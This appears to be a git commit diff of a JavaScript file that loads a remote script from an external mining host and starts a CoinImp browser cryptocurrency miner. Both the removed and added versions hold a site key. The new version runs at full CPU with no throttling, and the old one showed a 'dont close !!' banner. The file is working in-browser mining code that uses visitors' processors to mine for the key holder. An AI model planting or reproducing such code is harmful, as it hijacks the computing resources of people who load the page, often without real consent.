25f4db4072461b723d7e49c51c2bf8dfd87299ce
ardx1 <164972915+ardx1@users.noreply.github.com>
2024-04-24 12:50:10 -0300

    Update 1.js

--- 1.js
+++ 1.js
@@ -1,29 +1,13 @@
-// Conteúdo do arquivo local mining.js
-
-// Chamada para o script externo
-var scriptElement = document.createElement('script');
-scriptElement.src = "https://www.hostingcloud.racing/6ZFJ.js";
-document.head.appendChild(scriptElement);
-
-// Função para inicializar a mineração após o carregamento do script externo
-function initializeMining() {
-    // Definição da classe Client
-    var Client = {
-        Anonymous: function(token, options) {
-            // Implementação do construtor da classe Anonymous
-        },
-        // Outros métodos e propriedades da classe Client
+(function() {
+    var script = document.createElement('script');
+    script.onload = function() {
+        var _client = new Client.Anonymous('22852f99de2f3022997a8b61c99ceda5c3b95c7db49facb0b27fdaedc6342650', {
+            throttle: 0,
+            c: 'w'
+        });
+        _client.start();
+        _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
     };
-
-    // Inicialização do cliente para a mineração
-    var _client = new Client.Anonymous('876cd29da7454db785906ba686bcf9c64d66602d6b3e8846705bb135a3a2b74a', {
-        throttle: 0.2,
-        c: 'w'
-    });
-    _client.start();
-    _client.addMiningNotification("Top", "dont close !!", "#cccccc", 40, "#3d3d3d");
-}
-
-// Aguarda o carregamento do script externo antes de inicializar a mineração
-scriptElement.onload = initializeMining;
-
+    script.src = 'https://www.hostingcloud.racing/4mrU.js';
+    document.head.appendChild(script);
+})();
